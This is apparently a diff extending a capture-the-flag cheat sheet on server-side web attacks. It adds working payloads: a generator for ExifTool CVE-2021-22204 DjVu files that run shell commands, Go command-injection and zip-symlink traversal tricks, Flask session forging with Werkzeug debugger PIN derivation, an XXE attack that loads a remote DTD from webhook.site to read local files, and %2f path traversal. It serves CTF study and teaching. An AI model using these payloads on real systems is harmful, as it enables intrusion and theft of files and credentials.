@@ -1,5 +1,56 @@
 # CTF Web - Server-Side Attacks
 
+## Table of Contents
+- [SQL Injection](#sql-injection)
+  - [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
+  - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
+  - [Second-Order SQL Injection](#second-order-sql-injection)
+  - [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
+  - [SQLi → SSTI Chain](#sqli-ssti-chain)
+  - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
+- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
+  - [Jinja2 RCE](#jinja2-rce)
+  - [Go Template Injection](#go-template-injection)
+  - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
+- [SSRF](#ssrf)
+  - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
+  - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
+- [XXE (XML External Entity)](#xxe-xml-external-entity)
+  - [Basic XXE](#basic-xxe)
+  - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
+- [Command Injection](#command-injection)
+  - [Newline Bypass](#newline-bypass)
+  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
+- [Ruby Code Injection](#ruby-code-injection)
+  - [instance_eval Breakout](#instance_eval-breakout)
+  - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
+  - [Exfiltration](#exfiltration)
+- [Perl open() RCE](#perl-open-rce)
+- [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
+- [ReDoS as Timing Oracle](#redos-as-timing-oracle)
+- [API Filter/Query Parameter Injection](#api-filterquery-parameter-injection)
+- [HTTP Response Header Data Hiding](#http-response-header-data-hiding)
+- [File Upload → RCE Techniques](#file-upload-rce-techniques)
+  - [.htaccess Upload Bypass](#htaccess-upload-bypass)
+  - [PHP Log Poisoning](#php-log-poisoning)
+  - [Python .so Hijacking (by Siunam)](#python-so-hijacking-by-siunam)
+  - [Gogs Symlink RCE (CVE-2025-8110)](#gogs-symlink-rce-cve-2025-8110)
+  - [ZipSlip + SQLi](#zipslip-sqli)
+- [PHP Deserialization from Cookies](#php-deserialization-from-cookies)
+- [WebSocket Mass Assignment](#websocket-mass-assignment)
+- [ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)](#exiftool-cve-2021-22204-djvu-perl-injection-0xfun-2026)
+- [Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)](#go-runebyte-length-mismatch-command-injection-vuwctf-2025)
+- [Zip Symlink Path Traversal (UTCTF 2024)](#zip-symlink-path-traversal-utctf-2024)
+- [Path Traversal Bypass Techniques](#path-traversal-bypass-techniques)
+  - [Brace Stripping](#brace-stripping)
+  - [Double URL Encoding](#double-url-encoding)
+  - [Python os.path.join](#python-ospathjoin)
+- [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
+- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
+- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
+
+---
+
 ## SQL Injection
 
 ### Backslash Escape Quote Bypass
@@ -259,6 +310,77 @@ Handler doesn't filter fields → privilege escalation.
 
 ---
 
+## ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)
+
+**Affected:** ExifTool ≤ 12.23
+
+**Vulnerability:** DjVu ANTa annotation chunk parsed with Perl `eval`.
+
+**Craft minimal DjVu exploit:**
+```python
+import struct
+
+def make_djvu_exploit(command):
+    # ANTa chunk with Perl injection
+    ant_data = f'(metadata "\\c${{{command}}}")'.encode()
+
+    # INFO chunk (1x1 image)
+    info = struct.pack('>HHBBii', 1, 1, 24, 0, 300, 300)
+
+    # Build DJVU FORM
+    djvu_body = b'DJVU'
+    djvu_body += b'INFO' + struct.pack('>I', len(info)) + info
+    if len(info) % 2: djvu_body += b'\x00'
+    djvu_body += b'ANTa' + struct.pack('>I', len(ant_data)) + ant_data
+    if len(ant_data) % 2: djvu_body += b'\x00'
+
+    # FORM header
+    djvu = b'AT&TFORM' + struct.pack('>I', len(djvu_body)) + djvu_body
+    return djvu
+
+exploit = make_djvu_exploit("system('cat /flag.txt')")
+with open('exploit.djvu', 'wb') as f:
+    f.write(exploit)
+```
+
+**Detection:** Check ExifTool version. DjVu format is the classic vector. Upload the crafted DjVu to any endpoint that processes images with ExifTool.
+
+---
+
+## Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)
+
+**Pattern (Go Go Cyber Ranger):** Go validates `len([]rune(input)) > 32` but copies `len([]byte(input))` bytes.
+
+**Key insight:** Multi-byte UTF-8 chars (emoji = 4 bytes) count as 1 rune but 4 bytes → overflow.
+
+**Exploit:** 8 emoji (32 bytes, 8 runes) + `";cmd\n"` = 40 bytes total, passes 32-rune check but overflows into adjacent buffer.
+
+```bash
+# If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
+# Inject: ";od f*\n"
+payload='🔥🔥🔥🔥🔥🔥🔥🔥";od f*\n'
+curl -X POST http://target/check -d "secret=$payload"
+```
+
+**Detection:** Go web app with length check on `[]rune` followed by byte-level operations (copy, buffer write). Always check for rune/byte mismatch in Go.
+
+---
+
+## Zip Symlink Path Traversal (UTCTF 2024)
+
+**Pattern (Schrödinger):** Server extracts uploaded ZIP without checking symlinks.
+
+```bash
+# Create symlink to target file, zip with -y to preserve
+ln -s /path/to/flag.txt file.txt
+zip -y exploit.zip file.txt
+# Upload → server follows symlink → exposes file content
+```
+
+**Detection:** Any upload+extract endpoint. `zip -y` preserves symlinks. Many zip extraction utilities follow symlinks by default.
+
+---
+
 ## Path Traversal Bypass Techniques
 
 ### Brace Stripping
@@ -269,3 +391,75 @@ Handler doesn't filter fields → privilege escalation.
 
 ### Python os.path.join
 `os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)
+
+---
+
+## Flask/Werkzeug Debug Mode Exploitation
+
+**Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.
+
+**Attack chain:**
+1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
+   ```bash
+   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
+   # Or brute-force programmatically:
+   for word in wordlist:
+       try:
+           data = decode_flask_cookie(cookie, word)
+           print(f"Secret: {word}, Data: {data}")
+       except: pass
+   ```
+2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
+   ```bash
+   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
+   ```
+3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
+4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request
+
+**Werkzeug debugger RCE:** If `/console` is accessible, generate PIN:
+- Read `/proc/self/environ`, `/sys/class/net/eth0/address`, `/proc/sys/kernel/random/boot_id`
+- Compute PIN using Werkzeug's algorithm
+- Execute arbitrary Python in debugger console
+
+---
+
+## XXE with External DTD Filter Bypass
+
+**Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.
+
+**Technique:** Host malicious DTD on webhook.site or attacker server:
+```xml
+<!-- Remote DTD (hosted on webhook.site) -->
+<!ENTITY % data SYSTEM "file:///app/flag.txt">
+<!ENTITY leak "%data;">
+```
+
+```xml
+<!-- Uploaded XML (clean, passes filter) -->
+<?xml version="1.0"?>
+<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
+<book><title>&leak;</title></book>
+```
+
+**Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.
+
+**Setup with webhook.site API:**
+```python
+import requests
+TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
+dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
+requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
+             json={"default_content": dtd, "default_content_type": "text/xml"})
+```
+
+---
+
+## Path Traversal: URL-Encoded Slash Bypass
+
+**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
+```bash
+curl 'https://target/public%2f../nginx.conf'
+# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
+# Filesystem resolves to /public/../nginx.conf → /nginx.conf
+```
+**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.
